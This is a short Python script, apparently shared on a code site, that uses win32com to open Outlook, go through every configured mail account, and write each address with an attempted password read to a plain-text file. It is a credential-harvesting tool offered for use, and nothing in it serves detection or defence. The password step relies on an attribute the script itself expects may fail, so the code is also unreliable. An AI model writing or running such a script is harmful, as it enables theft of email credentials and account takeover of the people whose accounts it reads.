#Don't forget to put a star
import win32com.client

outlook = win32com.client.Dispatch("Outlook.Application")
namespace = outlook.GetNamespace("MAPI")

accounts = namespace.Accounts

with open("email_accounts.txt", "w") as file:
    for account in accounts:
        email = account.SmtpAddress
        password = None
        try:
            password = account.Password
        except Exception as e:
            print(f"Could not get password for account {email}: {str(e)}")
        file.write(f"Email: {email}, Password: {password}\n")
#@pouryet
